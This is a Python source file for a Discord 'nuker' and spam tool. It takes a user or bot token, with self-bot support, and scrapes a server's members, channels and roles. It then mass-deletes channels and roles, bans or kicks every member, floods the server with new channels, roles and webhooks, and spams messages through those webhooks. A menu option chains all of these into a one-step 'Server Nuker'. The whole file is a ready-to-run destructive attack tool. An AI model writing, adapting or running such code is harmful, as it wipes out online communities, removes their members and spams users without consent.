import os
from os import system
from colorama import Fore
import discord
from discord.ext import commands
import requests
import threading
import time
from datetime import datetime

cr = Fore.RED
cb = Fore.BLUE
cbl = Fore.BLACK
cc = Fore.CYAN
cg = Fore.GREEN
cw = Fore.WHITE
clb = Fore.LIGHTBLUE_EX
clc = Fore.LIGHTCYAN_EX
clr = Fore.LIGHTRED_EX
clw = Fore.LIGHTWHITE_EX
cly = Fore.LIGHTYELLOW_EX
clm = Fore.LIGHTMAGENTA_EX
clg = Fore.LIGHTGREEN_EX

system(f'cls & title Nao Spammer made by nyaouu#2917')

token = input(f'{clc}[root@nao] Token : {cw}')
guild = input(f'{clc}[root@nao] Guild id : {cw}')

intents = discord.Intents.all()
intents.members = True

def check_token(token: str) -> str:
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": token}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token(token)

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix="!", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix="!", case_insensitive=False, intents=intents)

def cls():
    system(f'cls & title Nao Nuker made by nyaouu#2917')

class Nao:
    async def Scrape(self, guild):
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()
        try:
            os.remove("data/members.txt")
            os.remove("data/channels.txt")
            os.remove("data/roles.txt")
        except:
            pass
        membercount = 0
        channelcount = 0
        rolecount = 0
        cls()
        with open('data/members.txt', 'w') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            m.close()
        with open('data/channels.txt', 'w') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            c.close()
        with open('data/roles.txt', 'w') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            r.close()
        cls()

    def SpamChannels(self, guild, type, name):
        while True:
            json = {'name': name, 'type': int(type)}
            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cg}+{cw}] {cg} Created Channel")
                    break
                else:
                    print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cr}-{cw}] {cr} Can't Create Channels")
                    break

    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cg}+{cw}] {cg} Deleted Channel {channel}")
                    break
                else:
                    print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cr}-{cw}] {cr} Can't Delete Channel {channel}")
                    break
    
    async def SpamChannelsExecute(self):
        name = input(f'{clc}[root@nao] Name Channel : {cw}')
        type = input(f'{clc}[root@nao] Type Channel {cw}[ {cg}T {clc}, {cg}V {cw}] : ')
        amount = input(f'{clc}[root@nao] Amount : {cw}')
        cls()
        if type == "T" or type == "t":
            typ = 0
        elif type == "V" or type == "v":
            typ = 2
        else:
            typ = 0
        for i in range(int(int(amount))):
            threading.Thread(target=self.SpamChannels, args=(guild, typ,name)).start()
        cls()

    async def DeleteChannelsExecute(self):
        cls()
        await self.Scrape(guild)
        time.sleep(2)
        channels = open('data/channels.txt')
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel)).start()
        channels.close()
        cls()

    def SpamRoles(self, guild, name):
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cg}+{cw}] {cg} Created Role")
                    break
                else:
                    print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cr}-{cw}] {cr} You Cant Create Roles")
                    break

    def DeleteRoles(self, guild, role):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cg}+{cw}] {cg} Deleted Role {role}")
                    break
                else:
                    print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cr}-{cw}] {cr} Can't Delete Roles {role}")
                    break 

    async def SpamRolesExecute(self):
        names = input(f'{clc}[root@nao] Name Role : {cw}')
        amount = input(f'{clc}[root@nao] Amount : {cw}')
        cls()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, names)).start()
        cls()

    async def DeleteRolesExecute(self):
        cls()
        await self.Scrape(guild)
        time.sleep(2)
        roles = open('data/roles.txt')
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role)).start()
        cls()
        roles.close()

    def KickMembers(self, guild, member):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cg}+{cw}] {cg} Kicking {member}")
                    break
                else:
                    print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cg}-{cw}] {cr} Can't Kick {member}")
                    break

    def BanMembers(self, guild, member):
        while True:
            r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cg}+{cw}] {cg} Banning {member}")
                    break
                else:
                    print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cg}-{cw}] {cr} Can't Ban {member}")
                    break

    async def KickMembersExecute(self):
        cls()
        await self.Scrape(guild)
        time.sleep(2)
        members = open('data/members.txt')
        for member in members:
            threading.Thread(target=self.KickMembers, args=(guild, member)).start()
        cls()
        members.close()

    async def BanMembersExecute(self):
        cls()
        await self.Scrape(guild)
        time.sleep(2)
        members = open('data/members.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member)).start()
        cls()
        members.close()

    def CreateWebhook(self, channel, name):
        while True:
            data = {'name' : name}
            r = requests.post(f'https://discord.com/api/v9/channels/{int(channel)}/webhooks', headers = headers , json = data)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cg}+{cw}] {cg} Created webhook {channel}")
                break
            else:
                print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cg}-{cw}] {cr} Can't create webhook {channel}")
                break
    
    async def CreateWebhookExecute(self):
        name = input(f'{clc}[root@nao] Name Webhook : {cw}')
        cls()
        await self.Scrape(guild)
        time.sleep(2)
        channels = open('data/channels.txt')
        for channel in channels:
            threading.Thread(target=self.CreateWebhook, args=(channel, name)).start()
        cls()
        channels.close()

    def SendWebhook(self, webhook, message):
        while True:
            r = requests.post(webhook, json = {"content": str(message)})
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cg}+{cw}] {cg} Send webhook {webhook}")
                break
            else:
                print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cg}-{cw}] {cr} Can't send webhook {webhook}")
                break

    def SpamWebhook(self, webhook, message, amount):
        for _ in range(int(amount)):
            self.SendWebhook(webhook, message)

    async def SpamWebhookExecute(self):
        message = input(f'{clc}[root@nao] Message : {cw}')
        amount = input(f'{clc}[root@nao] Amount : {cw}')
        cls()
        webhooks = open('data/webhooks.txt')
        for webhook in webhooks:
            webhook = webhook.strip()
            threading.Thread(target=self.SpamWebhook, args=(webhook, message, amount)).start()
        time.sleep(4)
        webhooks.close()
        cls()

    def DeleteWebhook(self, webhook):
        while True:
            r = requests.delete(webhook)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cg}+{cw}] {cg} Delete webhook {webhook}")
                break
            else:
                print(f"{cw}[{cb}{datetime.now().strftime('%H:%M:%S')}{cw}] [{cg}-{cw}] {cr} Can't delete webhook {webhook}")
                break

    async def DeleteWebhookExecute(self):
        cls()
        await self.Scrape(guild)
        time.sleep(2)
        webhooks = open('data/webhooks.txt')
        for webhook in webhooks:
            webhook = webhook.strip()
            threading.Thread(target=self.DeleteWebhook, args=(webhook)).start()
        cls()
        webhooks.close()

    async def NukeServerExecute(self):
        namech = input(f'{clc}[root@nao] Name Channel : {cw}')
        type = input(f'{clc}[root@nao] Type Channel {cw}[ {cg}T {clc}, {cg}V {cw}] : ')
        amountch = input(f'{clc}[root@nao] Amount Channels : {cw}')
        namer = input(f'{clc}[root@nao] Name Role : {cw}')
        amountr = input(f'{clc}[root@nao] Amount Roles : {cw}')
        namew = input(f'{clc}[root@nao] Name Webhook : {cw}')
        action = input(f'{clc}[root@nao] Want To Action Member {cw}[ {cg}Y{cw}/{cg}n {cw}] : {cw}')
        if action == "Y" or action == "y":
            korb = input(f'{clc}[root@nao] Want To Ban or  Kink {cw}[ {cg}B{cw}/{cg}K {cw}] : {cw}')
        else:
            pass
        await self.Scrape(guild)
        time.sleep(2)
        cls()
        channels = open('data/channels.txt')
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel)).start()
        channels.close()
        roles = open('data/roles.txt')
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role)).start()
        roles.close()
        if action == "Y" or action == "y":
            if korb == "B" or korb == "b":
                members = open('data/members.txt')
                for member in members:
                    threading.Thread(target=self.BanMembers, args=(guild, member)).start()
                members.close()
            elif korb == "K" or korb == "k":
                members = open('data/members.txt')
                for member in members:
                    threading.Thread(target=self.KickMembers, args=(guild, member)).start()
                members.close()
            else:
                pass
        else:
            pass
        if type == "T" or type == "t":
            typ = 0
        elif type == "V" or type == "v":
            typ = 2
        else:
            typ = 0
        for i in range(int(int(amountch))):
            threading.Thread(target=self.SpamChannels, args=(guild, typ, namech)).start()
        for i in range(int(amountr)):
            threading.Thread(target=self.SpamRoles, args=(guild, namer)).start()
        await self.Scrape(guild)
        time.sleep(2)
        channels = open('data/channels.txt')
        for channel in channels:
            threading.Thread(target=self.CreateWebhook, args=(channel, namew)).start()
        channels.close()
        cls()

    async def Menu(self):
        banner = f"""{clr}
                            ╔═╗ ╔╗             ╔═╗ ╔╗    ╔╗                     {cw}[ {clc}Discord {cw}] {cg}: {clc}nyaouu#2917{clr}
                            ║║╚╗║║             ║║╚╗║║    ║║         
                            ║╔╗╚╝║╔══╗ ╔══╗    ║╔╗╚╝║╔╗╔╗║║╔╗╔══╗╔═╗
                            ║║╚╗║║╚ ╗║ ║╔╗║    ║║╚╗║║║║║║║╚╝╝║╔╗║║╔╝
                            ║║ ║║║║╚╝╚╗║╚╝║    ║║ ║║║║╚╝║║╔╗╗║║═╣║║ 
                            ╚╝ ╚═╝╚═══╝╚══╝    ╚╝ ╚═╝╚══╝╚╝╚╝╚══╝╚╝

                            {cw}[{clc}1{cw}] {clg}Create Channels     {cw}[{clc}6{cw}] {clg}Ban Members
                            {cw}[{clc}2{cw}] {clg}Delete Channels     {cw}[{clc}7{cw}] {clg}Create Webhooks
                            {cw}[{clc}3{cw}] {clg}Create Roles        {cw}[{clc}8{cw}] {clg}Spam Webhooks
                            {cw}[{clc}4{cw}] {clg}Delete Roles        {cw}[{clc}9{cw}] {clg}Delete Webhooks
                            {cw}[{clc}5{cw}] {clg}Kick Members        {cw}[{clc}10{cw}] {clg}Server Nuker {cw}
    """
        system(f'cls & title Nao Nuker made by nyaouu#2917')
        print(banner)
        choice = input(f"{clc}[root@nao] choice : {cw}")
        if choice == "1":
            await self.SpamChannelsExecute()
            cls()
            time.sleep(4)
            await self.Menu()
        elif choice == "2":
            await self.DeleteChannelsExecute()
            cls()
            time.sleep(4)
            await self.Menu()
        elif choice == "3":
            await self.SpamRolesExecute()
            cls()
            time.sleep(4)
            await self.Menu()
        elif choice == "4":
            await self.DeleteRolesExecute()
            cls()
            time.sleep(4)
            await self.Menu()
        elif choice == "5":
            await self.KickMembersExecute()
            cls()
            time.sleep(4)
            await self.Menu()
        elif choice == "6":
            await self.BanMembersExecute()
            cls()
            time.sleep(4)
            await self.Menu()
        elif choice == "7":
            await self.CreateWebhookExecute()
            cls()
            time.sleep(4)
            await self.Menu()
        elif choice == "8":
            await self.SpamWebhookExecute()
            cls()
            time.sleep(4)
            await self.Menu()
        elif choice == "9":
            await self.DeleteWebhookExecute()
            cls()
            time.sleep(4)
            await self.Menu()
        elif choice == "10":
            await self.NukeServerExecute()
            cls()
            time.sleep(4)
            await self.Menu()
        else:
            await self.Menu()

    @client.event
    async def on_ready():
        await Nao().Menu()

    def Startup(self):
        try:
            if token_type == "user":
                client.run(token, bot=False)
                system(f'cls & title Nao Nuker made by nyaouu#2917')
            elif token_type == "bot":
                client.run(token)
                system(f'cls & title Nao Nuker made by nyaouu#2917')
        except:
            input(f'{cw}[{cr}WARNING{cw}] {cr}Invalid Token{cw}')
            os._exit(0)


if __name__ == "__main__":
    Nao().Startup()
